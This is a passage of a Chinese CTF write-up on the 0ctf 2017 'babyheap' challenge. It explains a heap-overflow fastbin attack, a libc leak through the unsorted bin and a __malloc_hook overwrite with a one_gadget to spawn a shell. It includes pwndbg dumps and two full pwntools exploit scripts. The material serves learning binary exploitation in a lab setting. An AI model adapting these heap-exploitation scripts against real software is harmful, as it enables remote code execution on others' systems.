    0x555555757070: 0x0000000000000000  0x0000000000000000
    0x555555757080: 0x0000000000000000  0x0000000000000091 ==>4
    0x555555757090: 0x0000000000000000  0x0000000000000000
    0x5555557570a0: 0x0000000000000000  0x0000000000000000
    0x5555557570b0: 0x0000000000000000  0x0000000000000000
    0x5555557570c0: 0x0000000000000000  0x0000000000000000
    0x5555557570d0: 0x0000000000000000  0x0000000000000000
    0x5555557570e0: 0x0000000000000000  0x0000000000000000
    0x5555557570f0: 0x0000000000000000  0x0000000000000000
    0x555555757100: 0x0000000000000000  0x0000000000000000
    0x555555757110: 0x0000000000000000  0x0000000000020ef1
    0x555555757120: 0x0000000000000000  0x0000000000000000
    0x555555757130: 0x0000000000000000  0x0000000000000000
接下来，通过堆溢出漏洞，将chunk2的fd指针第一个字节修改为0x80指向chunk4，由于1， 2都被free，所以通过chunk0进行修改  
因为申请fast chunk时会检测chunk_size和chunk_index是否匹配【index计算方式为：(chunk size) >>
(SIZE_SZ == 8 ? 4 : 3) – 2，在64位平台上SIZE_SZ为8】，所以我们还需要修改chunk4的size位为0x21
    alloc(0x10) ==>得到原来chunk2空间
    alloc(0x10) ==>得到chunk4空间，可以控制
前提：当内存中只有一个small chunk的时候，且该chunk处于申请空间的内存最高位，那么释放后的fd bk并不会指向libc中的某处  
所以我们应该再alloc一个small chunk，使chunk4不在最高位  
再将chunk4的size位修复，使chunk4被释放后，fd bk指向libc某处  
这时候打印chunk2就可以得到top
chunk，它与main_arena偏移固定，为0x3c4b78，减去它即得到libc基地址（在fastbin为空时，unsortbin的fd和bk指向自身main_arena）  
又，malloc中不为空时，就执行它指向的函数，如果我们将指针改为shell函数，那么调用malloc就会触发getshell
    pwndbg> x/30gx &__malloc_hook-0x10
    0x7ffff7dd1a90 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1aa0 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1ab0 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1ac0 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1ad0 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1ae0 :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1af0 :   0x00007ffff7dd0260  0x0000000000000000
    0x7ffff7dd1b00 :   0x00007ffff7a92e20  0x00007ffff7a92a00
    0x7ffff7dd1b10 : 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b20 :    0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b30 : 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b40 : 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b50 : 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b60 : 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b70 : 0x0000000000000000  0x00005555557571a0
`__malloc_hook`恰好在`main_arena - 0x10`处。
    pwndbg> x/10x 0x7ffff7dd1ae0 - 0x3
    0x7ffff7dd1add :   0x0000000000000000  0x0000000000000000
    0x7ffff7dd1aed :   0xfff7dd0260000000  0x000000000000007f
    0x7ffff7dd1afd:                         0xfff7a92e20000000  0xfff7a92a0000007f
    0x7ffff7dd1b0d :  0x000000000000007f  0x0000000000000000
    0x7ffff7dd1b1d:                         0x0000000000000000  0x0000000000000000
偏移为0x3c4b78 - (0x7ffff7dd1b70 - 0x7ffff7dd1aed) = 0x3c4aeb
### exp1
> 小tips：缩进的tab或空格不能混用，要么全用tab 要么全用空格。okok我今天才第一次遇见
    #!usr/bin/python
    from pwn import *
    context.log_level = 'debug'
    ip = " "
    port = 0
    io = 0
    elf = ELF("./babyheap_0ctf_2017")
    def menu(choice):
        io.sendlineafter(": ", str(choice))
    def alloc(size):
        menu(1)
        io.sendlineafter(": ", str(size))
    def fill(idx, size, content):
        menu(2)
        io.sendlineafter(": ", str(idx))
        io.sendlineafter(": ", str(size))
        io.sendafter(": ", content)
    def free(idx):
        menu(3)
        io.sendlineafter(": ", str(idx))
    def dump(idx):
        menu(4)
        io.sendlineafter(": ", str(idx))
    def pwn(ip, port, debug):
        global io
        if(debug == 1):
            io = process("./babyheap_0ctf_2017")
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            io = remote(ip, port)
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        alloc(0x10)     #0
        alloc(0x10)     #1
        alloc(0x10)     #2
        alloc(0x10)     #3
        alloc(0x80)     #4
        free(1)
        free(2)
        payload = p64(0)*3
        payload += p64(0x21)
        payload += p64(0)*3
        payload += p64(0x21)
        payload += p8(0x80)
        fill(0, len(payload), payload)
        payload = p64(0)*3
        payload += p64(0x21)
        fill(3, len(payload), payload)
        alloc(0x10)     #1==> 2
        alloc(0x10)     #2==> 4
        payload = p64(0)*3
        payload += p64(0x91)
        fill(3, len(payload), payload)
        alloc(0x80)
        free(4)
        dump(2)
        io.recvuntil("\n")
        libc_base = u64(io.recvuntil("Command")[:8].strip().ljust(8, "\x00"))-0x3c4b78
        log.info("libc_base: "+hex(libc_base))
        alloc(0x60)
        free(4)
        payload = p64(libc_base+0x3c4aed)
        fill(2, len(payload), payload)
        alloc(0x60)
        alloc(0x60)
        one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        payload = p8(0)*3
        payload += p64(0)*2
        payload += p64(libc_base + one_gadget[1])
        fill(6, len(payload), payload)
        alloc(233)
        io.interactive()
    if __name__ == '__main__':
      pwn("node3.buuoj.cn", 28315, 1)
### 分析2
  1. 通过unsorted bin的指针来泄露libc_base  
要打印出指针，就需要使用`Dump`功能来打印，但是`Dump`只能打印没有被`Free`的content  
想要打印出被free的内容，就可以想到通过打印一个没有被`Free`的content，但是其中包含了一个被free的chunk，如何实现？
既然存在堆溢出，当然是通过改写size来达到目的。  
如图理解  
显然A B的前后都需要申请chunk，前一个chunk为了造成堆溢出改写A的size位，后一个chunk防止与top chunk合并  
同时这些chunk的大小都必须是unsorted bin，这样B被free后 fd bk 都指向unsorted_addr，可以得到libc_base
  2. 劫持`__malloc_hook`，通过堆溢出改写fd到`__malloc_hook`附近地址，连续calloc两次就到附近地址进行写入，写入到`__malloc_hook`时将该处填写成`one_gadget`即可。再次Alloc调用calloc时，就会执行`__malloc_hook`处的`one_gadget`拿shell了。【这里和我文章fastbin attack中search这个题一样的】
好了可以着手写exp了
### exp2
原po说的是exp没有libc限制，其实不然....
    from pwn import *
    #ARCH SETTING
    context(arch = 'amd64' , os = 'linux')
    r = process('./babyheap')
    # r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size):
       r.recvuntil("Command: ")
       r.sendline("1")
       r.recvuntil("Size: ")
       r.sendline(str(size))
    def edit(idx,size,content):
       r.recvuntil("Command: ")
       r.sendline("2")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
       r.recvuntil("Size: ")
       r.sendline(str(size))
       r.recvuntil("Content: ")
       r.send(content)
    def delet(idx):
       r.recvuntil("Command: ")
       r.sendline("3")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
    def echo(idx):
       r.recvuntil("Command: ")
       r.sendline("4")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
    new(0x90) #idx.0 to unsorted bin
    new(0x90) #idx.1 to unsorted bin
    new(0x90) #idx.2 to unsorted bin
    new(0x90) #idx.3 for protecting top_chunk merge
    delet(1)
    payload_expand = 'A'*0x90 + p64(0) + p64(0x141)
    edit(0,len(payload_expand),payload_expand)
    new(0x130)
    payload_crrct = 'A'*0x90 + p64(0) + p64(0xa1)
    edit(1,len(payload_crrct),payload_crrct)
    delet(2)
    echo(1)
    r.recvuntil("Content: n")
    r.recv(0x90 + 0x10)
    fd = u64( r.recv(8) )
    libc_unsort = fd
    libc_base = libc_unsort - 0x3c4b78
    new(0x90) #idx.2 clean the heap-bins environment
    new(0x10) #idx.4 for overflow
    new(0x60) #idx.5 to fastbin[5] 
    new(0x10) #idx.6 for protecting top_chunk merge
    delet(5) #NOTICE: idx.5 recycled after here !!!
    malloc_hook_fkchunk = libc_base + 0x3c4aed
    payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
    edit(4,len(payload_hj),payload_hj)
    new(0x60) #idx.5
    new(0x60) #idx.7
    onegadget_addr = libc_base + 0x4526a
    payload_hj2onegadget = 'A'*3 + p64(0) + p64(0) + p64(onegadget_addr)
    edit(7,len(payload_hj2onegadget),payload_hj2onegadget)
    new(0x100)
    r.interactive()
* * *
> 参考：  
>  1  
>   zh/>  
>  上述四种attack方法的demo都可以参照ctfwiki中给的 ↑  
>    
>  search：  
>    
>   ==>他把两种方法【wiki &&
> gulshansingh的】都分析了一下  
>
> veritas师傅有一篇[调教pwndbg的文章](https://veritas501.space/2018/03/27/%E8%B0%83%E6%95%99pwndbg/)可以优化`find_fake_fast`，不需要设置大小，直接打印出可用的和padding  
>  2  
>  